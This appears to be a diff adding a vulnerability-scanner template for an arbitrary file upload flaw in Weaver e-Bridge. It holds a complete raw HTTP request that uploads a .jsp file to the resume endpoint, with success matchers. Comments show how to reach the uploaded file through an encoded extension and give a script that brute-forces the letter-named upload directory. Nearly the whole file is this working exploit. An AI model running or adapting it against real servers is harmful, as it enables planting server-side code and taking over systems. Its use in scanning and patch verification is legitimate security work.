@@ -1,0 +1,66 @@
+id: e-Bridge-addResume-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 泛微云桥0day-任意文件上传漏洞
+  reference:
+    - https://mp.weixin.qq.com/s/v9uyL_Vm8s4oAkfdZuoZFA
+    - https://mp.weixin.qq.com/s/_XGhSWT0k_prUbhRZ5MmrQ
+  tags: tags
+http:
+  - raw:
+      - |+
+        POST /wxclient/app/recruit/resume/addResume?fileElementld=H HTTP/1.1
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary83Hl3B723UfEAUV0
+        Content-Length: 280
+
+        ------WebKitFormBoundary83Hl3B723UfEAUV0
+        Content-Disposition: form-data; name="file";filename="1234.jsp"
+
+        123123
+        ------WebKitFormBoundary83Hl3B723UfEAUV0
+        Content-Disposition: form-data; name="file";filename="1234.jsp"
+
+        123123
+        ------WebKitFormBoundary83Hl3B723UfEAUV0--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"status":"success"'
+      - type: word
+        part: header
+        words:
+          - '200'
+#http://ip/upload/202408/C/1234.js%70
+#url链接C处根据环境不同而变化。1、有的环境是1个大写字母.2、有的环境是2个大写字母.最多不会超过 2 位。例如可能为 C  CD  EF  E 这样的。
+#使用python脚本生成：
+#import string
+#
+# 获取所有字母
+#letters = string.ascii_uppercase
+#
+# 输出单个字母
+#for letter in letters:
+#    print(letter)
+
+#print("\n")  # 分隔符
+#
+# 输出两个字母组合
+#for letter1 in letters:
+#    for letter2 in letters:
+#        print(f"{letter1}{letter2}")
+
+
